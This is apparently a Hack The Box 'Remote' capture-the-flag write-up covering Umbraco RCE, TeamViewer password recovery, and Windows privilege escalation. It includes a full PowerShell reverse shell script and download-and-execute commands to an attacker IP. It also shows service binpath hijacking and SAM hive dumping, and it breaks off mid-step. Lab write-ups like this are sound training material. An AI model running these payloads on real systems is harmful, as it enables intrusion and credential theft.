# Remote CTF - Hack THE BOX -WRITE-UP
# Enumeration
```bash
sudo nmap -v -sC -sV <target's ip>
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nfs           2-4 (RPC #100003)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T20:07:19
|_  start_date: N/A
|_clock-skew: 59m53s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.67 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.072KB)
```

**Findings:**
	OS: Microsoft Windows Server 2019
	rpcservices
Shares:
	FTP Share
	SMB Share
	NFS Share
Website - jquery 3.1.0; port:80


Looking at the FTP Share:
```bash
ftp <target's ip>                                                   
220 Microsoft FTP Service
Name (10.129.230.172:lilith): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
It is completely empty, also we don't have any access to file uploading. But may be we will be able to upload and subsequently download file being on the the side of the fence. 

SMB share: Access denied, however we can try to grab its banner and discover os build + hostname
```bash
smbclient -NL <target's ip>                                         
Can't load /etc/samba/smb.conf - run testparm to debug it
session setup failed: NT_STATUS_ACCESS_DENIED
```

```bash
nxc smb 10.129.39.112 -u 'guest' -p " "                                                      
SMB         10.129.39.112   445    REMOTE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:None)
```

**Findings:** 
OS:  Windows 10 / Server 2019 Build 17763 x64
Hostname/Domain Name: Remote

NFS Share provides us interesting folder, accessed by `everyone`
```bash
showmount -e <target's ip>                                          
Export list for 10.129.230.172:
/site_backups (everyone)
```
Mounting folder && Discovering its content
```bash
 sudo mount -t nfs -o nolock 10.129.230.172:/site_backups /mnt/nfs/remote 
```
```bash                                                                                      ls -la /mnt/nfs/remote        
drwx------ nobody nobody 4.0 KB Sun Feb 23 20:35:48 2020 .
drwxr-xr-x root   root   4.0 KB Sat Aug  1 22:07:22 2026 ..
drwx------ nobody nobody  64 B  Thu Feb 20 19:16:39 2020 App_Browsers
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:17:19 2020 App_Data
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:16:40 2020 App_Plugins
drwx------ nobody nobody  64 B  Thu Feb 20 19:16:40 2020 aspnet_client
drwx------ nobody nobody  48 KB Thu Feb 20 19:16:42 2020 bin
drwx------ nobody nobody 8.0 KB Thu Feb 20 19:16:42 2020 Config
drwx------ nobody nobody  64 B  Thu Feb 20 19:16:42 2020 css
.rwx------ nobody nobody 152 B  Thu Nov  1 19:06:44 2018 default.aspx
.rwx------ nobody nobody  89 B  Thu Nov  1 19:06:44 2018 Global.asax
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:16:42 2020 Media
drwx------ nobody nobody  64 B  Thu Feb 20 19:16:42 2020 scripts
drwx------ nobody nobody 8.0 KB Thu Feb 20 19:16:47 2020 Umbraco
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:16:47 2020 Umbraco_Client
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:16:47 2020 Views
.rwx------ nobody nobody  28 KB Thu Feb 20 07:57:54 2020 Web.config
```
It looks like Web-Sites config or backup (based on the naming). **Key Finding**: Umbraco CMS

Visiting port 80:
![](<../assets/img/Remote/Pasted image 20260801221929.png>)

Dummy website, but it gives is 5 names, which could be used in the potential brute-force attack
![](<../assets/img/Remote/Pasted image 20260801222007.png>)

Discovering / Fuzzing Umbraco CMS
```bash
ffuf -w ~/Documents/Seclists/Discovery/Web-Content/common.txt -u http://10.129.230.172/FUZZ  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.230.172/FUZZ
 :: Wordlist         : FUZZ: /home/lilith/Documents/Seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Home                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 223ms]
blog                    [Status: 200, Size: 5011, Words: 1249, Lines: 138, Duration: 6151ms]
Products                [Status: 200, Size: 5338, Words: 1307, Lines: 130, Duration: 9893ms]
People                  [Status: 200, Size: 6749, Words: 2109, Lines: 168, Duration: 9925ms]
Blog                    [Status: 200, Size: 5011, Words: 1249, Lines: 138, Duration: 3677ms]
Contact                 [Status: 200, Size: 7890, Words: 828, Lines: 125, Duration: 8156ms]
contact                 [Status: 200, Size: 7890, Words: 828, Lines: 125, Duration: 3621ms]
home                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 221ms]
install                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 151ms]
intranet                [Status: 200, Size: 3323, Words: 683, Lines: 117, Duration: 244ms]
master                  [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 176ms]
people                  [Status: 200, Size: 6739, Words: 2109, Lines: 168, Duration: 127ms]
person                  [Status: 200, Size: 2741, Words: 503, Lines: 82, Duration: 2816ms]
products                [Status: 200, Size: 5328, Words: 1307, Lines: 130, Duration: 378ms]
product                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 3524ms]
umbraco                 [Status: 200, Size: 4040, Words: 710, Lines: 96, Duration: 975ms]
:: Progress: [4751/4751] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:54] :: Errors: 1 ::
```
We found a login page!
![](<../assets/img/Remote/Pasted image 20260801222051.png>)

**Findings:**  
**OS:** Windows 10 / Server 2019 Build 17763 x64
**Hostname:** REMOTE
**Web-Site's config (backup)** (NFS Share)
**CMS running** - Umbraco CMS - People (staff) - Login Page

---
# Foothold
After some research, we can substantiate the importance only of 2 file: `App_Data` and `Web.Config`
```bash
ls -la /mnt/nfs/remote        
drwx------ nobody nobody 4.0 KB Thu Feb 20 19:17:19 2020 App_Data
...
.rwx------ nobody nobody  28 KB Thu Feb 20 07:57:54 2020 Web.config
...
```
`App_Data` contains file `Umbraco.sdf`, which serves as a **local database**.
After some attempts, and trying grepping word like `password`; `root`; `user`.. we finally find administrator's credentials.
```bash
 strings App_Data/Umbraco.sdf | grep admin     
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```
Findings:
Umbraco.sdf - database of Umbraco CMS
	Administrator's mail: admin@htb.local
	Administrator's hash: b8be16afba8c314ad33d812f22a04991b90e2aaa

Hash is simply cracked using the hashcat and the wordlist `rockyou.txt`
```bash
hashcat -m 100 adminhash --show                                        
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```
![](<../assets/img/Remote/Pasted image 20260801224115.png>)

![](<../assets/img/Remote/Pasted image 20260801224131.png>)

![](<../assets/img/Remote/Pasted image 20260801224226.png>)

![](<../assets/img/Remote/Pasted image 20260801224348.png>)
Admin Dashboard gives only another credentials and ability to change password. Nonetheless, `ssmith` doesn't brings us any new features or details.

**BUT!** It also gives us file upload page, which could be used for uploading any malicious payload.
![](<../assets/img/Remote/Pasted image 20260803184949.png>)

Trying to find the CVE:
```bash
 searchsploit umbraco                                       
 ...
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                          | aspx/webapps/46153.py
...
```
```bash
searchsploit -m aspx/webapps/46153.py                                                        
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /snap/searchsploit/566/opt/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: <missing file package>
Copied to: /home/lilith/46153.py
```
It requires CMS version - **7.12.4**. We can find it in `Web.Config`
```bash
grep -i 7.12 Web.config                                                
<add key="umbracoConfigurationStatus" value="7.12.4" />
```

Before gaining the shell, we need to figure out: how does exploit works?
Simply: It is **XXE vulnerability,** which gives us a **Remote Code Execution - RCE**. We can modify parameters :`{ string cmd = "<command"...` for inserting the command and `proc.StartInfo.Filename = "<application.exe>"`.

Let's try to ping ourselves using `/c ping <our ip>` before setting up the `tcpdump` with `icmp` filter 
![](<../assets/img/Remote/Pasted image 20260801231029.png>)

Launching the exploit:
```python
python3 exploit.py
```
Catching the packets:
```bash
sudo tcpdump -i  tun0 -v icmp                                          
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:09:34.875186 IP (tos 0x0, ttl 127, id 61844, offset 0, flags [none], proto ICMP (1), length 60)
    10.129.230.172 > arch: ICMP echo request, id 1, seq 1, length 40
23:09:34.875204 IP (tos 0x0, ttl 64, id 33331, offset 0, flags [none], proto ICMP (1), length 60)
```
---
#### Break down - Reverse Shell
`tcpdump` receives the ICMP packets, which means: it tries to communicate with the our (attacker's) machine. In other words: We can deploy Reverse Shell for infiltration. 

![](<../assets/img/Remote/Pasted image 20260803191844.png>)
A reverse shell is a type of remote shell where an **attacker exploits a known vulnerability to insert a payload** (instructions) into the target system (e.g., forcing the target to connect back to the attacker). As the **target parses and processes the payload, it initiates a connection back to the attacker’s machine** on a specified port, allowing the attacker to execute commands remotely. It is commonly used because firewalls and NAT devices often block incoming connections but allow outgoing connections.

---

From now, we have 2 possible ways of obtaining the reverse shell:
1. Building our own based on the `nishang` templates
2. Using `web_delivery` module (`Metasploit Framework`) creating an payload and catching it.

## Nishang
https://github.com/samratashok/nishang - (from the official description) Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

In other words, it gives us a vast choice of  templates, which we can modify and utilize according to our purposes. 

``` bash
ls ~/tools/nishang/Shells/                                                
... 
Invoke-PowerShellTcp.ps1
...    

cp ~/tools/nishang/Shells/Invoke-PowerShellTcp.ps1 ~/powerhell.ps1
```
After Choosing the payload we just need to edit it (chose from the examples and paste on them in the end).  Final Version:
```powershell                  
function Invoke-PowerShellTcp 
{ 

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[>)$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.240 -Port 4444   # Editted part
```
Before executing we also edit our exploit
![](<../assets/img/Remote/Pasted image 20260803195039.png>)
`{ string cmd = "IEX (IWR http://<ip of a web server>:<port>/<nishangshell.ps1 -UseBasicParing)"` downloads file (reverse shell) from our own web-server
	 **IWR** (Invoke-WebRequest) - reaches out to the specified URL and downloads the raw text content of the script 
	  **IEX** (Invoke-Expression) - takes downloaded scripts and executes it directly from the memory (shell triggering) 
`proc.StartInfo.Filename = "powershell.exe"`. executes powershell (scripting environment and a command-line interpreter)

**Steps:**
1. Setting up simple web-server `python3 -m http.server 9001`
2. Starting the listener on the same port as it was in the reverse shell payload
3. Script (exploit) execution

Exploit downloads the webshell
```python
 python3 46153.py                                                      
Start
[]
```
Sever Receives `GET` request - the victim downloads and executes the file
```bash
python3 -m http.server 9001                                            
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.129.230.172 - - [01/Aug/2026 23:33:17] "GET /powershell.ps1 HTTP/1.1" 200 -
```
**We are in!** Netcat receives connection.
```bash
nc -nlvp 4444                                                          
Listening on 0.0.0.0 4444
Connection received on 10.129.230.172 49691
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

---

## Metasploit Framework

The same result with the minimal efforts (comparing to the previous) can be obtained using `Metasploit Framework` - `web_delivery` module

It does exactly the same thing:
1. Web-Server Launch
2. Generates and provides payload
3. Once it is executed gives us a shell

```bash
msfconsole -q                                     

use exploit/multi/script/web_delivery            # selecting the module 
set RHOSTS <targets ip>                          # inserting parameters (target ip)
set payload windows/x64/meterpreter/reverse_tcp  # chosing paylaod (type of shell and os)
set LHOST tun0                                   # inserting parameters (local ip)
set LPORT 5555                                   # inserting parameters (local port)   
set target 2                                     # chosing powershell as execution method
run
```

``` bash
[*] Started reverse TCP handler on 10.10.14.240:7777 
[*] Using URL: http://10.10.14.240:8080/ns5RRShoSUz
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB0AFoAUgA9...
```
From this point we need to edit our exploit, paste the string above and ultimately - receive the connection.

![](<../assets/img/Remote/Pasted image 20260803201031.png>)

```python
python3 46153.py                                                      
Start
[]
```
```
[*] <target's ip> web_delivery - Delivering AMSI Bypass (1400 bytes)
[*] <target's ip> web_delivery - Delivering Payload (3690 bytes)
[*] Sending stage (248902 bytes) to 10.129.230.172
[*] Meterpreter session 1 opened (10.10.14.240:7777 -> 10.129.230.172:49744) at 2026-08-02 11:26:27 +0300```
```
Metasploit opens session and just wait our interaction
`session -i <id>` - for choosing session

---
# Privilege Escalation
## System Enumeration
Firstly, we must perform system enumeration for taking a look at the potential privilege escalation vectors:

```powershell
syysteminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 4:03:29 PM
System Boot Time:          8/2/2026, 1:29:25 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 268 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 503 MB
Virtual Memory: In Use:    1,928 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4516115
                           [03]: KB4523204
                           [04]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.39.112
                                 [02]: fe80::90be:f1da:304:fb7f
                                 [03]: dead:beef::90be:f1da:304:fb7f
Hyper-V Requirements:      A hypervisor has been detected. Features r
```
Surprisingly, we have access to the `systeminfo` command, which reveals the entire system configuration.

```powershell
PS C:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
**Interesting Note:** we have `SeImpersonatePrivilege`, which could lead to the privilege escalation via the popular kernel exploits from the **`Juicy Potato`** family


``` powershell
PS C:\windows\system32\inetsrv> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
PS C:\windows\system32\inetsrv> 
```
Nothing Interesting.

```powershell
 PS C:\> ls
    Directory: C:\
Mode                LastWriteTime         Length Name                                        ----                -------------         ------ ----                                                                   
d-----         8/2/2026   7:31 PM                ftp_transfer                                d-----        2/19/2020   3:11 PM                inetpub                                   
d-----        2/19/2020  11:09 PM                Microsoft                                  d-----        9/15/2018   3:19 AM                PerfLogs                                   d-r---         7/9/2021   7:41 AM                Program Files                               d-----        2/23/2020   2:19 PM                Program Files (x86)                         d-----         8/2/2026   1:29 PM                site_backups                                d-r---        2/19/2020   3:12 PM                Users                                       d-----        8/17/2021   9:34 AM                Windows                                     
```
We can observe `ftp_transfer` folder, which could refer to our ftp share. It is empty as well, but this is the **potential way of transmitting files from the target's machine to our.** 

```powershell
evil-winrm-py PS C:\Users\Administrator\Documents> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        136 K
...            
spoolsv.exe                   1964 Services                   0     16,376 K
...         
TeamViewer_Service.exe        2264 Services                   0     25,312 K
...                 
```

While determining running services, we can see one uncommon thing - TeamViewer, program used worldwide for remote connection, but it is also known due to its vulnerability (`CVE-2019-18988`), which could leak password (decrypt registry files). **Vulnerable versions:** from 7.0.43148 to 14.7.1965

```powershell
(Get-ItemProperty -Path "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe").VersionInfo.FileVersion
7.0.43148.0
```
`7.0.43148.0` -  it satisfies our requirements, so it can be easily exploited using post-exploitation module of the `Metasploit Framework`

---

### CVE-2019-18988 - How does it works?
Vulnerable versions of TeamViewer (associated with **CVE-2019-18988**) rely on a static, hardcoded AES key (`0602000000a400005253413100040000`) and Initialization Vector (`0100010067244F436E6762F25EA8D704`) for credential storage.

Encrypted password entries are stored in the Windows Registry under the following paths:

- **32-bit systems:** `HKLM\SOFTWARE\TeamViewer`
- **64-bit systems:** `HKLM\SOFTWARE\WOW6432Node\TeamViewer`

The Metasploit module (`post/windows/gather/credentials/teamviewer_passwords`) automates post-exploitation by extracting registry values containing encrypted strings—such as `SecurityPasswordAES`, `OptionsPasswordAES`, and `ServerPasswordAES`. Once retrieved, the module decrypts these payloads using the known static key material and outputs the plaintext credentials.

```bash
msfconsole -q
use post/windows/gather/credentials/teamviewer_passwords
set SESSION 1
run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /home/lilith/.msf4/loot/20260802113142_default_10.129.230.172_host.teamviewer__562431.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
```
We got the password - `!R3m0te!`
```bash
evil-winrm-py -i 10.129.230.172 -u Administrator -p '!R3m0te!'                                                    
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.230.172:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
remote\administrator
```
From now, **we are the administrator.**

---
### Privilege Escalation Vector - WinPEAS && Binary Path Exploitation
`WinPEAS` - popular tools, which automates process of the internal enumeration (OS enumeratios). Once executed it gather all possible information about the system, performing the commands as the user who execute it. 

However, its main drawback is **NOISE** occurred due to amount of the commands executed one-by-one and checking all possible way of the escalation. 

For uploading `WinPEAS` to the target set up web-server and make the request to it:
```powerhell
IWR http://10.10.14.240:6666/winPEASx64.exe -UseBasicParsing -OutFile winpeas.exe
```
Afterward - just launch it 
```powerhell
./winpeas.exe
```
It gives us overwhelming amount of information, but while scrolling down we can see this:
![](<../assets/img/Remote/Pasted image 20260802121734.png>)

`UsoSvc` can be altered! Which means we can modify the path to its binary, inserting our payload (from `Metasploit` or from `Nishang `- never mind ). But firstly - we must determine, which one built-in account is running the service?
```powershell
Get-CimInstance Win32_Service -Filter "Name='UsoSvc'" | Select-Object Name, StartName, State
Name   StartName   State  
----   ---------   -----  
UsoSvc LocalSystem Stopped
```
`LocalSystem` - means that service is running with the highest existent privileges (as the System).

**STEP1:** Encoding the command:
```bash
echo -n "IEX (IWR http://10.10.14.240:9001/powershell.ps1 -UseBasicParsing)" | iconv -t UTF-16LE | base64 -w 0
```
Powershell work with the `UTF-16LE` format, simultaneously we also encode it with `base64 `one-liner (`-w 0` )  for avoiding potential character conflicts

**STEP2:** Config modification:
```powershell
sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADQAMAA6ADkAMAAwADEALwByAGUAeAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAA=="
[SC] ChangeServiceConfig SUCCESS
```
As previously mentioned, we modify the entire path to the service executable to insert our encoded payload. We instruct `cmd.exe` (using the `/c` flag to execute the specified command and immediately terminate) to launch `powershell.exe` with the `-EncodedCommand` flag, passing the payload as the argument.

**STEP3:** Set up listener on the same port as it is in the payload:
```bash
nc -nlvp 4444                                                          
Listening on 0.0.0.0 4444
```
**STEP4:** Restart the service for updating its parameters.
``` powershell
PS C:\windows\system32\inetsrv> sc.exe stop UsoSvc

SERVICE_NAME: UsoSvc 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODEn  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530 
```
```powershell
PS C:\windows\system32\inetsrv> sc.exe start UsoSvc
```
**STEP5:** We receive the connection
```bash
nc -nlvp 4444                                                          
Listening on 0.0.0.0 4444
Connection received on 10.129.230.172 49766
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
```
**STEP6:** Verifying Current Privilege:
``` poweshell
PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> 
```

---
### Privilege Escalation Vector - SAM Dumping
**`Security Account Manager (SAM)`** hive - a part of the Windows registry, which **stores all information about _local accounts_** - usernames, security identifiers (SIDs), group memberships, and password hashes (NTLM hashes, stored as LM/NT hash pairs depending on configuration)

**`SYSTEM`** hive - basically stores the hardware and system configuration data. **Critically**: stores **boot key** (`sys key`), which is used to **encrypt and decrypt password hashes** stored in the **`SAM`**.

So, we can instruct our service to dump `SAM` database and extract all necessary information. **BUT!** How we will transmit all data for dumping it? Let's go back to the **`system enumeration`**: 

```powershell
 PS C:\> ls
    Directory: C:\
Mode                LastWriteTime         Length Name                                        ----                -------------         ------ ----                                                                   
d-----         8/2/2026   7:31 PM                ftp_transfer                                d-----        2/19/2020   3:11 PM                inetpub                                   
d-----        2/19/2020  11:09 PM                Microsoft                                  d-----        9/15/2018   3:19 AM                PerfLogs                                   d-r---         7/9/2021   7:41 AM                Program Files                               d-----        2/23/2020   2:19 PM                Program Files (x86)                         d-----         8/2/2026   1:29 PM                site_backups                                d-r---        2/19/2020   3:12 PM                Users                                       d-----        8/17/2021   9:34 AM                Windows                                     
```
In the root directory (`C:\`), there is an `ftp_transfer` folder where we can save both registry hives directly (or copy them over after saving). We can then connect to the FTP server using anonymous login to download the files for offline credential extraction.

**STEP1:** Encoding the command:
```bash
echo -n 'reg save HKLM\SAM C:\Users\Public\Documents\sam.hive && reg save HKLM\SYSTEM C:\Users\Public\Documents\system.hive' | iconv -t utf-16le | base64 -w 0
cgBlAGcAIABzAGEAdgBlACAASABLAEwATQBcAFMAQQBNACAAQwA6AAAAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABvAGMAdQBtAGUAbgB0AHMAXABzAGEAbQAuAGgAaQB2AGUAIAAmACYAIAByAGUAZwAgAHMAYQB2AGUAIABIAEsATABNAFwAUwBZAFMAVABFAE0AIABDADoAAABzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABEAG8AYwB1AG0AZQBuAHQAcwBcAHMAeQBzAHQAZQBtAC4AaABpAHYAZQA=
```
**STEP2:** Config modification:
```powershell
